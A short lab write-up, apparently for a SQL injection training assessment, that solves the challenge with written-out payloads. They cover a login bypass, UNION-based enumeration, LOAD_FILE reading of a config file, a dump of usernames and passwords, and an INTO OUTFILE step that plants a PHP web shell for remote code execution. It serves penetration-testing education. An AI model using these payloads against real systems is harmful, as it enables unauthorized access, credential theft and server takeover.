# 🏗️ Skills Assessment - SQL Injection Fundamentals

_**Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.**_

<figure><img src="../../../.gitbook/assets/image (1295).png" alt=""><figcaption><p>admin' OR 1=1-- -</p></figcaption></figure>

```
' UNION SELECT 1,2,3,4,5-- -
```

<figure><img src="../../../.gitbook/assets/image (1296).png" alt=""><figcaption></figcaption></figure>

```
' UNION SELECT 1,@@version,3,4,5-- -
```

<figure><img src="../../../.gitbook/assets/image (1297).png" alt=""><figcaption></figcaption></figure>

```
' UNION SELECT 1,user(),3,4,5-- -
```

<figure><img src="../../../.gitbook/assets/image (1298).png" alt=""><figcaption><p>root@localhost,</p></figcaption></figure>

```
' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3,4,5-- -
```

<figure><img src="../../../.gitbook/assets/image (1299).png" alt=""><figcaption></figcaption></figure>

```
' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/shell.php'-- -
```

<figure><img src="../../../.gitbook/assets/image (1300).png" alt=""><figcaption><p>Can't create/write to file '/var/www/html/shell.php' (Errcode: 13 "Permission denied")</p></figcaption></figure>

So we don't have rights, i guess i have to switch users:

```
' UNION select 1,database(),3,4,5-- -
```

<figure><img src="../../../.gitbook/assets/image (1301).png" alt=""><figcaption><p>name of the current database</p></figcaption></figure>

```
' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4,5 from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- -
```

<figure><img src="../../../.gitbook/assets/image (1302).png" alt=""><figcaption></figcaption></figure>

```
' UNION select 1,username,password,4,5 from ilfreight.users-- -
```

<figure><img src="../../../.gitbook/assets/image (1303).png" alt=""><figcaption></figcaption></figure>

let's go and connect as adam with the command `adam'OR 1=1-- -`

```
cn' union select 1,'<?php system($_REQUEST[0]); ?>',3,4,5 into outfile '/var/www/html/dashboard/payload.php'-- -
```

<figure><img src="../../../.gitbook/assets/image (1304).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1306).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1305).png" alt=""><figcaption></figcaption></figure>

Big win :tada:
